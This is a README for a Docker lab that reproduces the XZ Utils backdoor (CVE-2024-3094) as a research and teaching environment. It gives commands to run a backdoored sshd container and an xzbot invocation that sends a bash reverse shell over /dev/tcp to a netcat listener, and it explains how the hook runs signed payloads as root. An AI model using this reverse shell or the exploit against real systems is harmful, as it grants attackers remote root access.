# XZ Backdoor (CVE-2024-3094) Lab Environment

This repository provides a controlled environment to demonstrate the Remote Code Execution (RCE) capabilities of the XZ Utils supply-chain attack. It utilizes a patched `liblzma` to allow exploitation using a custom Ed448 key.

## Prerequisites

* **Docker** (configured for amd64)
* **Go** (for the xzbot client)
* **Netcat** (for the reverse shell listener)

---

## Usage

### 1. Start the Backdoored SSH Server
Build and run the container. This simulates a host with the malicious `liblzma` library linked to `sshd`.

```bash
docker build -t xz-backdoor-lab .
docker run -p 2222:2222 --platform linux/amd64 -it --rm xz-backdoor-lab
```

### 2. Start the Listener
In a separate terminal, start a netcat listener to catch the incoming root shell.

```bash
nc -lvp 4444
```

### 3. Execute the Exploit
Install `xzbot` and trigger the RCE by embedding the command in a malicious RSA public key.

```bash
go install github.com/amlweems/xzbot@latest
~/go/bin/xzbot -addr localhost:2222 -cmd "bash -c 'bash -i >& /dev/tcp/host.docker.internal/4444 0>&1'"
```

---

## Technical Overview

The exploit functions by hooking the `RSA_public_decrypt` function within the OpenSSH process. 

1. **Interception**: During the SSH handshake, the backdoor intercepts the public key provided by the client.
2. **Verification**: It extracts a hidden payload from the RSA modulus $N$. This payload is signed with an Ed448 private key.
3. **Execution**: If the signature matches the public key embedded in the backdoor, the payload is decrypted and executed via `system()` with the privileges of the `sshd` process (root).

## Disclaimer
This lab is for educational purposes and security research only. Do not deploy backdoored libraries on production systems or networks exposed to the internet.
